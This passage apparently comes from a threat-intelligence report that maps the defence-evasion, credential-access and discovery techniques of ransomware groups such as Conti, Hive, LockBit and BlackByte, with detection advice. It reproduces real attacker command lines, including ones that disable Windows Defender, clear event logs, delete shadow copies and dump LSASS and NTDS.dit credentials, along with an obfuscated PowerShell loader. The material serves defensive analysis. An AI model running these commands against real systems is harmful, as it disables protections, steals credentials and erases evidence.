[BlackCat]\n\nAttackers inject code into other processes in order to evade security\nalerts. Process injection is running (malicious) code within the address\nspace of another process. Often adversaries target trusted system\nprocesses.\n\n**Conti, LockBit, BlackByte ransomware use the process hollowing**\ntechnique to inject code into a system process to avoid security\nalerts (C:\\windows\\system32, C:\\Windows\\). In this technique the\nransomware creates a process in suspended mode then hollows out its\nmemory and replaces it with malicious code.\n\nAn interesting example of process hollowing is performed by\n**Blackbyte. The ransomware injects code into regedit.exe. It is**\nremarkable that the process starts with the atypical command:\n```\n                    Command _ line: “$windir\\regedit.exe -single\n\n```\n1df11bc19aa52b623bdf15380e3fded56d8eb6fb7b53a224077\n9864b1a6474ad”\n\nFig. 20 — Suspicious activity: Blackbyte. Process Hollowing\n\n\n-----\n\nmalware from the eyes of the defenders behind system events. Often,\nin order to reduce the load on SIEM, security engineers filter the\nevents performed by system processes, considering them legitimate.\n\nProcess injection is one of the documented capabilities of\nCobaltStrike. CobaltStrike provides operators with various methods\nto inject code into other processes (process hollowing, shellcode\ninjection, on-disk DLL injection, etc). Often CobaltStrike injects code\ninto werfault.exe, and all further activity is performed by werfault.exe.\n\n##### Conclusion\n\nThis technique is widely used by ransomware to hide its activity and\nbypass security controls. Adversaries prefer to inject themselves into\nWindows system processes. All malicious activity will be performed\nby a legitimate process and may be ignored by security products. To\ndetect such a technique, monitor the CreateRemoteThread Event\nin Sysmon Logging, focus on critical Windows processes targeted\nfor injection, for example as we mentioned above: “regedit.exe”,\n“werfault.exe” and other processes. Most process injection methods\nare challenging to detect in SIEM logs. Windows API calls, writing to\nprocess memory should be monitored. The popular method of injecting\nmalicious code is DLL injection via API LoadLibrary that can be\ndetected based on Sysmon logs. To increase the probability of process\ninjection being detected, consider using an EDR solution.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Remote Thread Creation to Critical Process**\n\n**Appendix#1 - DLL Injection via LoadLibrary API**\n\n\n-----\n\nImpair Defences: Disable or Modify System Firewall T1562.004 - 4/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nWe saw that Conti, Pysa, Blackbyte, and Clop modified the System\nFirewall in order to bypass network security restrictions. The most\ncommon way to add, delete, or change existing rules is to use netsh.exe\nor PowerShell.\n\n**Conti makes Remote Desktop available via netsh:**\n\nCommand _ line: netsh advfirewall firewall set rule\ngroup=”Remote Desktop” new enable=yes\n\n**Blackbyte enables ‘File and Print Sharing’ and ‘Network Discovery’:**\n\nCommand _ line: netsh advfirewall firewall set rule File\nand Printer Sharing new enable=Yes\nCommand _ line: netsh advfirewall firewall set rule\nNetwork Discovery new enable=Yes\n\nAccording to a Kaspersky GERT investigation, Pysa uses PowerShell\nto enable ‘Remote Desktop’: Enable-NetFirewallRule -DisplayGroup\n**“Remote Desktop”**\n\n**Clop adds a program-based exception to the Microsoft Windows**\nFirewall via netsh.exe:\n\nCommand _ line: netsh firewall add allowedprogram\n“$user\\$temp\\svchos23.exe” “svchos23.exe” ENABLE\nCommand _ line: netsh firewall add allowedprogram\n“$user\\$temp\\cheats.exe” “cheats.exe” ENABLE\nCommand _ line: netsh firewall add allowedprogram\n“$user\\$temp\\IXP000.TMP\\crypted.exe” “crypted.exe”\nENABLE\n\n\n-----\n\n##### Conclusion\n\nRansomware operators act predictably: if they need access to RDP\nor they require certain ports to be open (139, 445), they would rather\nadd a firewall rule than try to bypass restrictions in subtle ways.\nDetection could be based on specific utilities and cmdlets (netsh,\nNetFirewallRule).\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Disabling Windows Firewall via Netsh.exe**\n\n**Appendix#1 - Firewall Configuration Modification via Netsh.exe**\n\nImpair Defenses: Disable or Modify Tools T1562.001 - 5/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware disables security features to ensure that sample\nexecution and file encryption will not be blocked.\n\n**BlackByte uses the taskkill utility to stop the Raccine tool**\n(ransomware vaccine) developed by Florian Roth. If Raccine detects\nthat any process is using vssadmin delete or vssadmin resize\n**shadowstorage, it will automatically terminate it, thereby preventing**\nthe encryptor from working. Therefore BlackByte first stops this\nutility and then removes the shadow copies:\n\nCommand _ line: taskill.exe /F /IM Raccine.exe\nCommand _ line: taskill.exe /F /IM RaccineSettings.exe\nCommand _ line: $windir\\$system32\\schtasks.exe /DELETE /\nTN “Raccine Rules Updater” /F\nCommand _ line: Get-WmiObject Win32 _ Shadowcopy |\nForEach-Object {$ _ .Delete();}\n\n\n-----\n\nCommand _ line: powershell New-ItemProperty -Path HKLM:\\\nSOFTWARE\\Policies\\Microsoft\\Windows Defender -Name\nDisableAntiSpyware -Value 1 -PropertyType DWORD -Force\nCommand _ line: powershell Set-MpPreference\n-DisableRealTimeMonitoring $true\n```\n                    Command _ line: powershell Uninstall-WindowsFeature\n\n```\n-Name Windows-Defender\n\nAccording to Kaspersky GERT investigations, Hive uses numerous\nutilities to disable security features on the target hosts.\n\n**Hive launches reg.exe to deal with Microsoft Defender features:**\n\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Services\\SecurityHealthService” /v\n“Start” /t REG _ DWORD /d “4” /f\nCommand _ line: reg.exe delete “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender” /v “DisableAntiSpyware” /t\nREG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender” /v “DisableAntiVirus” /t\nREG _ DWORD /d “1” /f\nCommand _ line: reg.exe add HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\MpEngine” /v “MpEnablePus”\n/t REG _ DWORD /d “0” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\Real-Time Protection” /v\n“DisableBehaviorMonitoring” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\Real-Time Protection” /v\n“DisableIOAVProtection” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\Real-Time Protection” /v\n“DisableOnAccessProtection” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\Real-Time Protection” /v\n“DisableRealtimeMonitoring” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\Real-Time Protection” /v\n“DisableScanOnRealtimeEnable” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\\nPolicies\\Microsoft\\Windows Defender\\Reporting” /v\n“DisableEnhancedNotifications” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\\nPolicies\\Microsoft\\Windows Defender\\SpyNet” /v\n“DisableBlockAtFirstSeen” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\SpyNet” /v “SpynetReporting”\n/t REG _ DWORD /d “0” /f\n\n\n-----\n\nPolicies\\Microsoft\\Windows Defender\\SpyNet” /v\n“SubmitSamplesConsent” /t REG _ DWORD /d “0” /f\nCommand _ line: reg add “HKLM\\Software\\Policies\\\nMicrosoft\\Windows Defender\\Real-Time Protection” /v\n“DisableRoutinelyTakingAction” /t REG _ DWORD /d “1” /f\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Services\\WdBoot” /v “Start” /t REG _\nDWORD /d “4” /f\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Services\\WdFilter” /v “Start” /t REG _\nDWORD /d “4” /f\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Services\\WdNisDrv” /v “Start” /t\nREG _ DWORD /d “4” /f\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Services\\WdNisSvc” /v “Start” /t\nREG _ DWORD /d “4” /f\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Services\\WinDefend” /v “Start” /t\nREG _ DWORD /d “4” /f\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Services\\SecurityHealthService” /v\n“Start” /t REG _ DWORD /d “4” /f\nCommand _ line: reg.exe add “HKLM\\System\\\nCurrentControlSet\\Control\\WMI\\Autologger\\\nDefenderApiLogger” /v “Start” /t REG _ DWORD /d “0” /f\nCommand _ line: reg.exe delete “HKLM\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Explorer\\StartupApproved\\Run” /v\n“Windows Defender” /f\nCommand _ line: reg.exe delete “HKCU\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Run” /v “Windows Defender” /f\nCommand _ line: reg.exe delete “HKLM\\Software\\Microsoft\\\nWindows\\CurrentVersion\\Run” /v “WindowsDefender” /f\nCommand _ line: reg.exe delete “HKCR\\*\\shellex\\\nContextMenuHandlers\\EPP” /f\nCommand _ line: reg.exe delete “HKCR\\Directory\\shellex\\\nContextMenuHandlers\\EPP” /f\nCommand _ line: reg.exe delete “HKCR\\Drive\\shellex\\\nContextMenuHandlers\\EPP” /f\n\nSome Pysa samples also disable Windows Defender and features\nthe same way via reg.exe or PowerShell. The PowerShell script used\nby Pysa contains commands to disable/uninstall antivirus solutions\n(Windows Defender; Malwarebytes Anti-Malware; Microsoft Security\nEssentials):\n\nFig. 21 — Pysa PowerShell script\n\n\n-----\n\n```\n                    powershell.exe\n\n```\nCommand _ line: Set-MpPreference\n-DisableRealtimeMonitoring $true;\nCommand _ line: Add-MpPreference -ExclusionExtension\n```\n                    “.exe”\n\n```\nCommand _ line: dism /online /Disable-Feature /\nFeatureName:Windows-Defender /Remove /NoRestart /quiet\n\nAdditionally we observed Hive used PowerShell to disable Microsoft\nDefender:\n```\n                    Image _ path: $windir\\$system32\\WindowsPowerShell\\v1.0\\\n                    powershell.exe\n\n```\nCommand _ line: powershell Set-MpPreference\n-DisableIOAVProtection $true\nCommand _ line: powershell Set-MpPreference\n-DisableRealtimeMonitoring $true\n\n**Hive also restores the installed signature definitions to the original**\ndefault set of signatures via direct use of MpCmdRun.exe:\n\nCommand _ line: cmd.exe /c “$programfiles\\Windows\nDefender\\MpCmdRun.exe” -RemoveDefinitions -All\n\nWe found that some Hive samples disable default Windows Defender\nscheduled tasks using schtasks.exe:\n\nCommand _ line: schtasks.exe /Change /TN “Microsoft\\\nWindows\\Windows Defender\\Windows Defender Cleanup” /\nDisable\nImage _ path: $windir\\$system32\\schtasks.exe\nParent _ image _ path: $selfpath\\$selfname.exe\n\nCommand _ line: schtasks.exe /Change /TN “Microsoft\\\nWindows\\Windows Defender\\Windows Defender Cache\nMaintenance” /Disable\nImage _ path: $windir\\$system32\\schtasks.exe\nParent _ image _ path: $selfpath\\$selfname.exe\n\n**SIGMA: (Available in the full version**\n**of the report in Kaspersky TIP)** Conclusion\n\n**Appendix#1 - Disabling Windows**\n**Defender via Registry** Modern security measures are able to detect and prevent the\n\nexecution of most ransomware families. For this reason, adversaries\n\n**Appendix#1 - Disabling or**\n**Modification Windows Defender via** attempt to disable these security features on the victims’ hosts. The\n**Powershell** termination of any of the security programs can easily be detected.\n\n**Appendix#1 - Windows Defender** Under normal circumstances, the disabling utilities should be regarded\n**Exclusions Modification via Registry** as a highly suspicious activity.\n\n\n-----\n\nMasquerading T1036 - 7/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nMost ransomware samples try to hide their activity when it is possible.\nThey use various techniques to achieve this, including trying to\npretend to be standard Operating System programs (svchost.exe,\nexplorer.exe, etc) or legitimate software (Chrome, Oracle, etc).\n\nA BlackCat sample dropped an executable with the name of cmd.exe:\n“$user\\$appdata\\[random]\\cmd.exe”\n\n**Pysa used Chachi RAT that created a Windows service and gives it the**\nfollowing description:\n\nFig. 22 — Suspicious activity: Pysa. Service creation\n\n\n-----\n\nsomething:\n```\n                    Image _ path: $windir\\$system32\\cmd.exe\n                    Command _ line: cmd /c “”$user\\$temp\\update.bat” “\n\n```\nWe found that Pysa dropped a file serving as a backdoor in C:\\\nProgramData\\Microsoft\\Windows\\Templates\\svchost.exe\n\nTo evade detection the RagnarLocker group created a VirtualBox\nVM with a custom image so the ransomware running inside the virtual\nmachine encrypts the host files while being ignored by anti-malware.\n\nThe backdoor installed by RagnarLocker also tries to hide an autorun\nentry bynaming it like a system file:\n\nCommand _ line: REG ADD “HKCU\\SOFTWARE\\Microsoft\\\nWindows\\CurrentVersion\\RunOnce” /V “Virtual Printer\nDriver” /t REG _ SZ /F /D “”$user\\$appdata\\Macromedia\\\nTemporary\\WinPrint.exe””\n\nAccording to Kaspersky GERT analysis, Hive creates a service named\nto look similar to the normal Windows binary “explorer.exe”:\n\nCommand _ line: $windir\\$system32\\cmd.exe /k C:\\Windows\\\ninf\\usbhub\\explorer.exe -f C:\\Windows\\inf\\usbhub\\config.\n```\n                    log\n\n```\nThe binary “explorer.exe” was identified as the anonymity tool TOR.\n\n**Clop tries to distract attention from Autorun/Startup entries:**\n\nImage _ path: $user\\$appdata\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\Java update.exe\n```\n                    Image _ path: $user\\$temp\\svchos23.exe\n                    Image _ path: $user\\$temp\\svchost.exe\n\n```\n**Clop also renames the file $user\\$temp\\cheats.exe to C:\\svchost.exe**\n\n##### Conclusion\n\nRansomware tries to look similar to normal system binaries, services,\n\n**SIGMA:**\n\nscheduled tasks, etc. So, for detection it is necessary to focus on\n\n**Appendix#1 - Executing File Named**\n\nthe anomalies that occur when ransomware uses masquerading\n\n**as System Process in Unusual**\n**Directory** techniques:\n\n**Appendix#1 - Anomaly in the**\n**Windows Critical Process Tree**    - [launching a system utility from an atypical directory]\n\n**Appendix#1 - Created Windows**    - [creating a file with the name of a system file in an open folder]\n**Shell from Critical Windows Process**    - [atypical utilities launch flags]\n\n\n-----\n\nIndicator Removal on Host: File Deletion T1070.004 - 5/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nRansomware, like any other sophisticated malware, tries to make the\nblue team’s job more difficult. One method is for ransomware to delete\nthe files responsible for a particular phase of the infection.\n\n**BlackByte deletes itself after execution:**\n```\n                    Command _ line: “$windir\\$system32\\cmd.exe /c ping\n\n```\n1.1.1.1 -n 10 > Nul & Del $selfpath\\$selfname.exe /F /Q”\n\n**LockBit fills with zeros the place on the file system where its**\nexecutable was located:\n```\n                    Command _ line: “$windir\\$system32\\cmd.exe” /C ping\n\n```\n127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0\nlength=524288 “$selfpath\\$selfname.exe” & Del /f /q\n“$selfpath\\$selfname.exe”\n\n**Pysa generates the following batch file to remove itself and then this**\nbatch file:\n\n:Repeat\ndel “[sample _ path]\\[sample.exe]”\nif exist “[sample _ path]\\[sample.exe]” goto Repeat\nrmdir “[sample _ path]”\ndel “C:\\Users\\[user]\\AppData\\Local\\Temp\\update.bat”\n\n**Clop used a similar batch file with the following content:**\n\n:: R\ndel” [path _ to _ orig _ file] “\nif exist” [path _ to _ orig _ file] “goto R\ndel” [batname].bat “\n\n\n-----\n\n##### Conclusion\n\nRansomware removes itself to make it harder to obtain the sample. If\nthe sample is not removed, it can be reverse-engineered right away.\nOtherwise, analysts first have to spend effort to recover it or find it by\nother means.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Ping and File Deletion in Command line**\n\nIndicator Removal on Host: Clear Windows Event Logs T1070.001 - 6/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAnother way to hide evidence is to clear any event logs. This method is\nvery popular with ransomware because it makes the incident response\nteam’s job more difficult. However, there are methods used in digital\nforensic that allow you to restore the course of events on an infected\nmachine without the information from the event logs.\n\n**Lockbit and Hive use one of the most popular event log utilities to**\nclear these logs\n```\n                    Command _ line: wevtutil cl application\n                    Command _ line: wevtutil cl security\n                    Command _ line: wevtutil cl system\n\n```\n**Clop clears all Administrative Event Logs in Event Viewer, by executing**\nthe following command:\n\nCommand _ line: cmd.exe /C for /F \\”tokens=*\\” %1 in\n(‘wevutil.exe el’) DO wevutil.exe cl \\”%1\\”\n\n\n-----\n\nCommand _ line: “cmd.exe /c for /F \\”tokens=*\\” %1 in\n(‘wevtutil.exe el’) DO wevtutil.exe cl \\”%1\\””\n\nFig. 23 — Suspicious activity: Blackcat. Event logs cleaning\n\n##### Conclusion\n\nIn most cases, attackers try to delete logs to further complicate an\ninvestigation. The best way to detect log deletions are events 1102\nand 104. Also tracking command line utilities such as wevutil.exe helps\nto detect Windows log deletion whenever the Security log is cleared,\nevent 1102 - “The audit log was cleared” occurs. One of the fields\ncontained in this event can correlate with the user who cleared the\nlog, namely the “Account Name”. Similar behaviour is observed in the\nSystem log event 104. For example: “The System log file was cleared”\nor “The Microsoft-Windows-PowerShell/Operational log file was\ncleared”. Here one can also see which log was cleared and by whom.\n\nSIGMA: (Available in the full version of the report in Kaspersky TIP)\n\nAppendix#1 - Clear Windows Event Logs via Command Line\n\nAppendix#1 - Clear Windows Event Logs\n\n\n-----\n\nDeobfuscate/Decode Files or Information T1140 - 7/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nUsing this technique allows the ransomware to bypass some defences\nand make it difficult for the blue team to operate. In turn, obfuscation\ncan sometimes confuse some SIEM correlation rules.\n\n**BlackByte uses the obfuscated PowerShell script:**\n```\n                    Image _ path: “$windir\\\\$system32\\\\cmd.exe”,\n                    Command _ line: “cmd /c del $windir\\\\$system32\\\\\n\n```\nTaskmgr.exe /f /q & del $windir\\\\$system32\\\\resmon.\nexe /f /q & powershell -command \\”$x = [System.Text.\nEncoding]::Unicode.GetString([System.Convert]::FromBase\n64String(‘Vw’+’BpA’+’G4ARAB’+’lAGYA’+’ZQB’+’uAG’+’QA’));St\nop-Service -Name $x;Set-Service -StartupType Disabled\n```\n                    $x\\””,\n                    Image _ path: “$windir\\$system32\\WindowsPowerShell\\v1.0\\\n                    powershell.exe”\n                    Command _ line: “$windir\\$system32\\WindowsPowerShell\\\n                    v1.0\\powershell.exe -command “$x = \n\n```\n[System.Text.Encoding]::Unicode.GetString([System.\nConvert]::FromBase64String(‘RwBlAHQALQBXAG0AaQBPA\nGIAagBlAGMAdAAg’+’AFcAaQBuADMAMgBfAFMAaABhAGQAbw\nB3AGMAbwBwAHkAIAB8AC’+’AARgBvAHIARQBhAGMAaAAtAE8AY\ngBqAGUAYwB0ACAAewAkA’+’F8ALgBEAGUAbABlAHQAZQAoACkAO\nwB9AA==’));Invoke-Expression $x”\n\n\n-----\n\nlaunch Empire.\n\nFig. 24 — Pysa PowerShell script\n\n**Conti uses a Base64 obfuscated stage loader ‘CompareForFor.hta’.**\nDeobfuscated code from this hta is displayed below.\n\nFig. 25 — Conti hta file\n\n##### Conclusion\n\nThe use of obfuscation helps ransomware circumvent defensive\nmechanisms that monitor the use of certain patterns in command lines\n(e.g. the Invoke-Expression substring of a command line). However,\nsuspicious behaviour and obfuscation itself can be detected to\ncounter it.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP):**\n\n**Appendix#1 - Encoded/decoded PowerShell Сode Execution**\n\n\n-----\n\n## Credential Access\n\nHere we consider a few of the most popular credential access\ntechniques used by ransomware actors. In order to move laterally\nthrough the network, actors try to obtain credentials. Having\ncredentials allows adversaries to run ransomware remotely. The prime\ngoal is to gain domain account control.\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|OS Credential Dumping: LSASS Memory T1003.001|||||||||\n|Credentials from Password Stores: Credentials from Web Browsers T1555.003|||||||||\n|Brute Force T1110|||||||||\n\n\nT1555.003\n\nBrute Force\nT1110\n\n\n-----\n\nOS Credential Dumping: LSASS Memory T1003.001 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nThe most common technique used by ransomware actors is dumping\nthe LSASS memory. They use very popular tools such as Mimikatz,\nK0adic, Empire, LaZagne (BlackCat, Lockbit, Pysa)\n\n**Pysa actors were also observed using the procdump tool to dump the**\nmemory of lsass.exe:\n```\n                    Command _ line: “procdump.exe -accepteula -ma lsass.exe\n                    mem.dmp”\n\n```\n**Pysa and Conti threat actors, for example, dump LSASS via the built-**\nin windows COM+ services DLL:\n```\n                    Command _ line: “$windir\\\\$system32\\\\rundll32.exe\n\n```\n$windir\\\\$system32\\\\comsvcs.dll, MiniDump <lsass _ pid>\n$windir\\\\$temp\\\\xxx full”\n\nRansomware groups using Cobalt Strike (Conti, RagnarLocker,\nBlackByte) accessed user credentials using the framework. The Cobalt\nStrike sample accessed lsass.exe with the rights 0x1010 (read rights)\nand dumped credentials of users logged on to the system.\n\n\n-----\n\ndumping lsass.exe, it was created with the regular expression:\n**“^0x\\w*[1235679abdef]\\w$”.**\n\nFig. 27 — Process rights (further)\n\nThis regular expression may be used in the detection rule based on\n**event id 10 in the Sysmon log (Process Accessed).**\n\nA secondary indicator of possible dumping the lsass.exe memory to\ngain credentials is setting the Registry Key that forces the system\nto store passwords in memory in plaintext, observed in a Hive\nransomware incident:\n\nImage _ path: “$selfpath\\$selfname”\nRegistry _ key: “\\REGISTRY\\SYSTEM\\CurrentControlSet\\\nControl\\SecurityProviders\\WDigest”\nRegistry _ value _ name: “UserLogonCredential”\nRegistry _ value: “0x00000001”\n\nIf actors are interested in gaining control over the domain, they may\nuse ntdsutil to dump the NTDS.dit database.\n\nTrickBot used by Conti threat actors uses a batch file with the\ncommand: “ntdsutil “ac in ntds” “ifm” “cr fu C:\\Perflogs\\1” q q “\n\n##### Conclusion\n\nThough most known AV- solutions successfully detect the\naforementioned tools, ransomware actors still use them, so regularly\ncheck for AV-base updates. Additionally, it would be more secure to\nrestrict WDigest authentication and enable LSA Protection. More\ndetails for mitigation approaches can be found in the Mitigation\n**section. We also provide SIGMA rules for this technique.**\n\n**SIGMA:**\n\n**Appendix#1 - Suspicious LSASS Memory Access**\n\n**Appendix#1 - Detected Access to SAM,SYSTEM and SECURITY**\n**registry hives**\n\n\n-----\n\nCredentials from Password Stores: Credentials from Web Browsers T1555.003 - 3/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAnother technique that we meet in ransomware attacks is the obtaining\ncredentials from web browsers. Credentials are then exfiltrated. This\ndata can help attackers expand access as there are cases where web\nbrowsing credentials overlap with privileged accounts.\n\nFor example, a sample of Agent Tesla malware used by the\n**RagnarLocker group accessed the following Chrome files containing**\npassword information:\n\nImage _ path: “$selfpath\\$selfname.exe”,\nFile _ path: “$user\\$appdata\\Mozilla\\Firefox\\\nProfiles\\054111xg.default\\key3.db”,\nFile _ path: “$user\\$appdata\\Google\\Chrome\\User Data\\\nDefault\\Login Data”,\n\n**Pysa group also used this technique:**\n\nImage _ path: “$selfpath\\$selfname.exe”,\nFile _ path: “$appdata\\Local\\Google\\Chrome\\User Data\\\nLocal State”,\nFile _ path: “$appdata\\Local\\Google\\Chrome\\User Data\\Web\nData-journal”,\nFile _ path: “$appdata\\Local\\Google\\Chrome\\User Data\\Web\nData”,\n\n**BlackCat ransomware actors use the WebBrowserPassView tool to**\nrecover passwords saved in browsers.\n\n##### Conclusion\n\nOften users save domain credentials in web browsers, which makes\n\n**SIGMA: (Available in the full version** gaining credentials easier for an attacker. Ransomware actors also\n**of the report in Kaspersky TIP)** utilise this technique to collect user data to use in future attacks. We\n\n**Appendix#1 - Suspicious Access to** recommend detecting suspicious access to credentials stores in web\n**Credentials from Web Browsers** browsers.\n\n\n-----\n\nBrute Force T1110 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nBrute-force is still an extremely common technique in order to gain\ncredentials. Ransomware actors target external remote services, RDP,\nVPN and others that are not sufficiently protected.\n\nMoreover, after gaining access to the system, actors continue to\nbrute-force nearby hosts in order to move laterally through the\nnetwork.\n\nIt is important to implement a password policy. This measure can\nreduce the risk of password guessing or matching passwords from\ncommon lists.\n\n##### Conclusion\n\nWe recommend monitoring authentication logs, and focusing on the\nhigh volume of login failures of valid accounts. In addition ransomware\nactors use password spraying, so monitor for many failed login\nattempts of multiple users.\n\n\n-----\n\n## Discovery\n\n\nDiscovery remains an inherent phase of an attack. Actors try to gather\nthe system’s and whole organisation’s infrastructure information. It\nwill help to navigate the network and explore what they can seize, or\ndetermine subsequent actions in the attack. Ransomware actors as\na rule try to maximise the attack surface, so they enumerate network\nshares and other hosts in the network, use network scanning, check\ncurrent system connections and explore relations in the Active\nDirectory.\n\n|Col1|Conti|Pysa|Clop (TA505)|Hive|Ragnar Locker|Lockbit|BlackByte|BlackCat|\n|---|---|---|---|---|---|---|---|---|\n|System Network Connections Discovery T1049|||||||||\n|Remote System Discovery T1018|||||||||\n|Network Share Discovery T1135|||||||||\n|Account Discovery T1087|||||||||\n|File and Directory Discovery T1083|||||||||\n|Process Discovery T1057|||||||||\n\n\nClop Ragnar\nConti Pysa Hive Lockbit BlackByte BlackCat\n(TA505) Locker\n\nSystem\nNetwork\nConnections\nDiscovery\nT1049\n\nRemote\nSystem\nDiscovery\nT1018\n\nNetwork\nShare\nDiscovery\nT1135\n\nAccount\nDiscovery\nT1087\n\nFile and\nDirectory\nDiscovery\nT1083\n\nProcess\nDiscovery\nT1057\n\n\n-----\n\nSystem Network Connections Discovery T1049 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nUpon gaining access to the system, threat actors usually query the\ncurrent active system connections where they can possibly move\nand encrypt nearby hosts. As a rule we typically see the following\ncommands performed by ransomware actors:\n```\n                    Command _ line: “net session”\n                    Command _ line: “net use”\n                    Command _ line: “netstat -ano”\n\n```\nCommand _ line: “query session”\n\nSome ransomware Trojans include built-in network connection\ndiscovery commands. This is from a BlackByte sample:\n\nFig. 28 — Suspicious Activity: Blackbyte. Discovery via net\n\n\n-----\n\n##### Conclusion:\n\nChecking current system connections is the easiest way to look\naround and to find out which machines to exploit next. The commands\nabove may be a good indicator of a System Network Connection\nDiscovery. Focus on unusual processes which run these commands.\n\n**SIGMA**\n\n**Appendix#1 - System Network Connections Discovery via Standard**\n**Windows Utilities**\n\n**Appendix#1 - System Network Connections Discovery via**\n**PowerShell**\n\nRemote System Discovery T1018 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nAnother discovery technique is enumerating the other remote hosts\nbelonging to the compromised network. The gained information will\nbe used for further lateral movement or just executing ransomware\nremotely.\n\n**BlackByte samples also perform remote system discovery, importing**\nthe PowerShell module ActiveDirectory and getting names of Domain\nComputers:\n\nCommand _ line: “powershell -command \\”Import-Module\nActiveDirectory;Get-ADComputer -Filter * -Properties *\n| FT Name\\””,\n```\n                    Command _ line: “net view”\n\n```\n\n-----\n\nattacks:\n```\n                    Command _ line: “net view /all”\n                    Command _ line: “net view /all /domain”\n\n```\nCommand _ line: “dsquery subnet -limit 0” - performed\non a domain controller (or server with AD DS role) to\nget subnet information\nCommand _ line: “nltest /domain _ trusts” - performed on\n```\n                    a domain controller to enumerate trusted domains\n\n```\nCommand _ line: “nltest /dclist” - performed on a\ndomain controller (or server with AD DS role) to get\nthe list of domain controllers\n\nThe most popular command, “arp -a”, is used by all analysed\nransomware actors. This command allows them to display the ARP\ncache with a mapping of IP addresses to MAC addresses.\n\nSome actors scan the network. For example, Lockbit enumerates\nnetwork shares, trying to connect to them using TCP ports 135, 445\n\nAdditionally, ransomware actors use the BloodHound utility to gather\ninformation about the victim’s infrastructure. BloodHound provides\nthe attacker with a visualisation of relationships in Active Directory\nand analysis of the AD rights.\n\nAnother toolset to gain information is the Powersploit framework\nwhich has a recon module that allows attackers to get information\nabout the network and Windows Active Directory domain.\n\n##### Conclusion:\n\nRemote system discovery is the most popular technique. The results\nof gaining information about the infrastructure will be used in the\nlateral movement phase. Therefore we are looking for commands that\nmay indicate remote hosts discovery and network scanning over the\norganisation.\n\n**SIGMA: (Available in the full version of the report in Kaspersky TIP)**\n\n**Appendix#1 - Remote System Discovery via Standard Windows**\n**Utilities**\n\n**Appendix#1 - Remote System Discovery via PowerShell**\n\n\n-----\n\nNetwork Share Discovery T1135 - 8/8\n\n### • [Conti]\n • [Pysa]\n • [Clop (TA505)]\n • [Hive]\n • [RagnarLocker]\n • [Lockbit]\n • [BlackByte]\n • [BlackCat]\n\nIn order to encrypt nearby hosts and get more victims, threat actors\nperform network share discovery. They enumerate shared network\ndrives and folders to access other systems.\n\nMost 